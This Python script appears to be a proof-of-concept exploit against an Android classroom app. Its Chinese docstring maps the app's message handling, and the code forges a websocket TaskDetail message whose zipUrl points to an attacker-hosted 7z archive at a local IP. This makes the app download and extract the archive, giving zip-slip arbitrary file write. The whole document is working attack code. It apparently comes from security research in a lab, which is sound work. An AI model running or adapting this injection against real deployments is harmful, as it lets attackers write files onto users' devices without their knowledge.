# -*- coding: utf-8 -*-
"""inject_task0.py - 注入 type=0 (CREATE_NEW_TASK) 的 TaskDetail 消息。
依据:
  MessageHandleForCanvasHelper:41  if (type == 0) => Gson.fromJson(TaskDetail)
        => ContextMessage.sendMsg("action_socket_create_new_task", taskDetail)
  TaskDetail.resourceInfo: ResourceInfo { zipUrl, sourceId, taskId, name, type }
  ResourceDownloader:150 needDecode(zipUrl) => 结尾 7z 才解压
  ResourceHelper:1464 Z7Extractor.extractFile  (唯一的解压点)
=> 让 App 自动下载我们的 zipUrl 并解压 => ZIP-SLIP => 任意写
"""
import json
import os
import time

BASE = os.path.dirname(os.path.abspath(__file__))
INJ = os.path.join(BASE, "ws_inject.txt")
OUR = "192.168.137.1"
ROOM = "UXHOVJJF"
UID = "2112229"
ZIP = "http://%s/poc7z.7z" % OUR


def env(mtype, data, cid, tag, cmd=0):
    return json.dumps({
        "cId": cid, "cmd": cmd, "from": "10001", "gt": 0, "id": "1349658", "rt": 1,
        "smsg": {"classRoomId": ROOM, "createTag": tag, "data": data,
                 "forward": 0, "senderId": 0, "type": mtype, "userIds": UID},
        "tags": ["RWYZKUIF"]}, ensure_ascii=False)


def inj(js, label, wait=10):
    with open(INJ, "w", encoding="utf-8") as f:
        f.write(js)
    print("INJ %s" % label, flush=True)
    time.sleep(wait)


def main():
    ri = {"sourceId": "LAB_R1", "taskId": "LAB_T1", "name": "poc7z",
          "type": 1, "zipUrl": ZIP}
    td = {"taskId": "LAB_T1", "subTaskId": "LAB_S1", "classroomId": ROOM,
          "classroomName": "lab", "taskStatus": 1, "taskType": 0,
          "desktopId": "LAB_D1", "sourceId": "LAB_R1", "number": 1,
          "originTotalNumber": 1, "content": "lab", "resourceInfo": ri,
          "createTime": int(time.time() * 1000), "completed": False,
          "pptSource": 1, "isFromPPT": 1, "taskCreateMode": 1}
    js = json.dumps(td, ensure_ascii=False)
    # canvas_tag 与 default_tag 各发一次(type=0 走 MessageHandleForCanvasHelper)
    inj(env(0, js, "179P00040", "canvas_tag"), "type=0 TaskDetail (canvas_tag)", 12)
    inj(env(0, js, "179P00041", "default_tag"), "type=0 TaskDetail (default_tag)", 12)
    # 另一种可能: type=1 (task_revoke 解析同 TaskDetail) 也带 zipUrl, 但先不试
    print("done", flush=True)


if __name__ == "__main__":
    main()
